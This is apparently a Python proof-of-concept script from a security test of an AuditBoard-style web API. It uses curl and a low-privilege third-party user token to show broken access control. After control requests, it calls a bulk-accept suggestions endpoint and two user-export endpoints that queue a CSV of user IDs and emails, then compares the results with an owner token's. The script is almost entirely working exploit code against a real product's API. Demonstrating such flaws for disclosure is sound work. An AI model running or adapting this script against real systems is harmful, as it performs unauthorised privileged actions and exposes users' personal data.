import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+tok,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
TP=open('/tmp/bac_TPU').read().strip()
TO=open('/tmp/bac_OWNER').read().strip()
print("=== PROOF 1: TPU is genuinely limited (control) ===")
for p in ['/api/v1/suggestions','/api/v1/suggestions/41','/api/v1/users/1','/api/v1/narratives/38']:
    c,b=req('GET',p,tok=TP)
    print(f"  TPU {c} {p:34} {b[:90].replace(chr(10),' ')}")
print()
print("=== PROOF 2: but TPU reaches bulk-accept-with-control-implementation ===")
body={"data":{"suggestionIds":[41],"createControlImpls":False,"programIds":[]}}
c1,b1=req('POST','/api/v1/suggestions/bulk-accept-with-control-implementation',body,tok=TP)
c2,b2=req('POST','/api/v1/suggestions/bulk-accept-with-control-implementation',body,tok=TO)
print(f"  TPU    -> {c1}")
print(f"  OWNER  -> {c2}")
print(f"  IDENTICAL RESPONSE: {b1==b2}")
print()
print("=== PROOF 3: does the response contain an authz denial? ===")
low=b1.lower()
for kw in ['permission','forbidden','denied','not authorized','modelactionpermissiondenied']:
    print(f"  contains '{kw}': {kw in low}")
print()
print("=== PROOF 4: TPU can also queue a users export (another privileged action) ===")
cols=[{"path":"id","label":"ID"},{"path":"email","label":"Email"}]
c,b=req('POST','/api/v1/users/export',{"exportColumns":cols,"query":{},"format":"csv","timezone":"UTC","fileName":"zx"},tok=TP)
print(f"  TPU users/export -> {c} {b[:90]}")
c,b=req('POST','/api/v1/users/_op/async_export',{"exportColumns":cols,"query":{},"format":"csv","timezone":"UTC","fileName":"zx"},tok=TP)
print(f"  TPU users/_op/async_export -> {c} {b[:90]}")
